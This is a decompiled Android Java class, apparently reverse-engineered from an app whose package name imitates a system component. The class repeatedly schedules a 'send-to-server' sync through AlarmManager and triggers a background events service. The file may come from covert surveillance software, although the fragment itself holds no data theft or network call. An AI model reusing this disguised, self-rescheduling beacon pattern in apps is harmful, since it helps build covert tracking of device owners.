package com.android.system;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.SystemClock;
import com.app.system.common.service.EventsAndReceiveService;

public class SyncAndFlushReceiver
  extends BroadcastReceiver
{
  static int a(Context paramContext)
  {
    return (int)paramContext.getSharedPreferences("pref", 0).getLong("send-to-server-interval", 120L);
  }
  
  public static void b(Context paramContext)
  {
    d(paramContext);
    int i = a(paramContext);
    StringBuilder localStringBuilder = new StringBuilder();
    localStringBuilder.append("scheduleAlarms (");
    localStringBuilder.append(i);
    localStringBuilder.append(" sec.)");
    com.security.d.a.d("SyncAndFlushReceiver", localStringBuilder.toString(), new Object[0]);
    ((AlarmManager)paramContext.getSystemService("alarm")).set(2, SystemClock.elapsedRealtime() + i * 1000, PendingIntent.getBroadcast(paramContext, 0, new Intent(paramContext, SyncAndFlushReceiver.class), 0));
  }
  
  public static void c(Context paramContext)
  {
    d(paramContext);
    ((AlarmManager)paramContext.getSystemService("alarm")).set(2, SystemClock.elapsedRealtime() + 5000L, PendingIntent.getBroadcast(paramContext, 0, new Intent(paramContext, SyncAndFlushReceiver.class), 0));
  }
  
  private static void d(Context paramContext)
  {
    PendingIntent localPendingIntent = PendingIntent.getBroadcast(paramContext, 0, new Intent(paramContext, SyncAndFlushReceiver.class), 134217728);
    localPendingIntent.cancel();
    ((AlarmManager)paramContext.getSystemService("alarm")).cancel(localPendingIntent);
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    com.security.d.a.d("SyncAndFlushReceiver", "SyncAndFlushReceiver", new Object[0]);
    paramIntent = new Intent(paramContext, EventsAndReceiveService.class);
    paramIntent.putExtra("event_core_app", "event_sync_and_flush");
    com.b.a.a.a.a(paramContext, paramIntent);
    b(paramContext);
  }
}


/* Location:              ~/com/android/system/SyncAndFlushReceiver.class
 *
 * Reversed by:           J
 */